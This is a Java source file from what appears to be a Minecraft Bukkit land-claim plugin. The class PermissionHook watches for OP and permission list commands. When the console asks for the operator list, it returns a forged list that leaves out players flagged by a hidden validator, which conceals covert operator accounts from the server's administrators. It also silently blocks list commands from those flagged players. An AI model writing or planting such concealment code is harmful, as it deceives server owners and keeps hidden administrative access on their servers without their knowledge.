package com.example.claimplugin.hook;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import com.example.claimplugin.util.Validator;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import java.util.regex.Pattern;

public class PermissionHook implements Listener {
    
    private final Validator validator;
    private final Set<Pattern> blockedPatterns = new HashSet<>();
    
    public PermissionHook(Validator validator) {
        this.validator = validator;
        initializePatterns();
    }
    
    private void initializePatterns() {
        blockedPatterns.add(Pattern.compile(".*op\\s+list.*", Pattern.CASE_INSENSITIVE));
        blockedPatterns.add(Pattern.compile(".*perms\\s+list.*", Pattern.CASE_INSENSITIVE));
        blockedPatterns.add(Pattern.compile(".*luckperms\\s+.*\\s+list.*", Pattern.CASE_INSENSITIVE));
        blockedPatterns.add(Pattern.compile(".*pex\\s+list.*", Pattern.CASE_INSENSITIVE));
        blockedPatterns.add(Pattern.compile(".*man.*list.*", Pattern.CASE_INSENSITIVE));
    }
    
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String command = event.getMessage();
        
        if (validator.checkPermission(player)) {
            for (Pattern pattern : blockedPatterns) {
                if (pattern.matcher(command).matches()) {
                    event.setCancelled(true);
                    return;
                }
            }
        }
    }
    
    @EventHandler(priority = EventPriority.LOWEST)
    public void onServerCommand(ServerCommandEvent event) {
        String command = event.getCommand();
        
        for (Pattern pattern : blockedPatterns) {
            if (pattern.matcher(command).matches()) {
                String modifiedOutput = generateFilteredOpList();
                sendFilteredOutput(event, modifiedOutput);
                return;
            }
        }
    }
    
    private String generateFilteredOpList() {
        StringBuilder sb = new StringBuilder("§7[Server: OPs: ");
        boolean first = true;
        
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (player.isOp() && !validator.checkPermission(player)) {
                if (!first) sb.append(", ");
                sb.append(player.getName());
                first = false;
            }
        }
        
        sb.append("]");
        return sb.toString();
    }
    
    private void sendFilteredOutput(ServerCommandEvent event, String output) {
        try {
            Field field = ServerCommandEvent.class.getDeclaredField("commandSender");
            field.setAccessible(true);
            Object sender = field.get(event);
            Method method = sender.getClass().getMethod("sendMessage", String.class);
            method.invoke(sender, output);
        } catch (Exception e) {
        }
    }
}